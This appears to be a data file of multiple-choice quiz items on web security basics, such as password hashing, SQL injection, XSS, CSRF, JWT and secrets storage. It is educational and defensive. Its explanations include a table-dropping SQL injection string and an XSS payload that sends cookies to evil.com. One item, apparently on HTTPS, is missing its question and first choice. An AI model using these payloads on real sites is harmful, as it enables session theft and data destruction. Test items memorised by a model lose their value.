questions.q: What is the difference between authentication and authorization?
choices: They are the same thing — both verify a user's identity
Authentication proves who you are; authorization decides what you can do
Authentication controls access to resources; authorization verifies passwords
Authentication is for APIs; authorization is for web pages
questions.explanation: Authentication answers 'Who are you?' — it verifies identity (logging in). Authorization answers 'What are you allowed to do?' — it controls access to resources. Both are required: a system that authenticates users but skips authorization checks lets any logged-in user reach any resource.

questions.q: Why should passwords never be stored in plain text?
choices: Plain text passwords take up more storage space
It violates HTTP protocol standards
A database breach would immediately expose every user's password
Plain text cannot be compared correctly during login
questions.explanation: If a database containing plain text passwords is breached, every account is instantly compromised — and because users reuse passwords, attackers often gain access to other services too. Hashing means a breach exposes only the hashes, which are computationally expensive to reverse.

questions.q: What does bcrypt add to a password before hashing it?
choices: An encryption key
A salt
A digital signature
An expiry timestamp
questions.explanation: bcrypt adds a random value called a salt before hashing. This means two users with the same password will have different hashes, and precomputed 'rainbow table' attacks (lookup tables of common password hashes) don't work. The salt is stored alongside the hash so login comparisons can still work.

questions.q: What is a SQL injection attack?
choices: Uploading malicious SQL files to a server
Accessing a database without a password
Inserting SQL code into user input to manipulate database queries
Running too many queries at once to crash the server
questions.explanation: SQL injection happens when user input is interpolated directly into a query string. An attacker can submit input like `1 OR 1=1` to change the query's logic and return data they shouldn't see — or `; DROP TABLE users;` to destroy data. Parameterized queries fix this by keeping the SQL structure and the values completely separate.

questions.q: What is the correct way to prevent SQL injection?
choices: Check that the input contains no spaces
Use parameterized queries (prepared statements)
Convert all input to uppercase
Require users to log in before making queries
questions.explanation: Parameterized queries pass the SQL and the values separately to the database driver. The database treats the values as data — never as SQL — so an attacker can't inject query structure through user input. ORMs like Prisma and Sequelize use parameterized queries automatically.

questions.q: What is an XSS (Cross-Site Scripting) attack?
choices: Stealing cookies by reading them from another domain
Injecting malicious scripts into a page that other users view
Intercepting HTTP requests between browser and server
Flooding a server with requests to take it offline
questions.explanation: XSS occurs when user-supplied text is rendered as HTML without being sanitized. An attacker submits a string like `<script>document.location='evil.com?c='+document.cookie</script>`. When another user views the page, that script runs in their browser — potentially stealing their session token or performing actions on their behalf.

Unauthorized database access
Eavesdropping and man-in-the-middle attacks on data in transit
Brute-force login attempts
questions.explanation: HTTPS uses TLS to encrypt the connection between the browser and the server. Without it, anyone on the same network (a coffee shop Wi-Fi, an ISP, a corporate proxy) can read every request and response in plain text — including login credentials and session tokens. Modern hosting platforms provide HTTPS automatically via Let's Encrypt.

questions.q: Where should API keys, database passwords, and JWT secrets be stored?
choices: In a config.js file at the root of the project
In a comment in the relevant source file for easy reference
In the repository's README so teammates can find them
In environment variables, never in source code or repositories
questions.explanation: Secrets committed to a repository are exposed to anyone with access — and once in git history, they're hard to remove completely. Environment variables keep secrets out of code; hosting platforms (Vercel, Render, Netlify) let you set them in their dashboard. Add .env to .gitignore immediately when you start a project.

questions.q: What is a JWT (JSON Web Token) used for?
choices: Encrypting data stored in a database
Compressing JSON payloads for faster API responses
Proving a user's identity to a server without a session database lookup
Storing form data temporarily in the browser
questions.explanation: A JWT is a signed token that encodes user data (like user ID and roles) in a verifiable way. The server signs it with a secret key; on future requests, the server verifies the signature to confirm the token is genuine — no database lookup required. This makes JWTs stateless and easy to scale, at the cost of not being revocable until they expire.

questions.q: What makes a Cross-Site Request Forgery (CSRF) attack work?
choices: The attacker steals the user's password directly
The browser automatically includes the user's cookies on a request the attacker tricked them into sending
The server has no HTTPS certificate
The user's JavaScript console is left open
questions.explanation: CSRF tricks a logged-in user's browser into submitting a request to your server — often via a hidden form on a malicious site — and because browsers automatically attach cookies to requests, the server can't tell it apart from a legitimate action. Defenses include CSRF tokens and SameSite cookies; APIs using token-based (Authorization header) auth aren't vulnerable to CSRF at all, since a cross-site request can't set arbitrary headers.
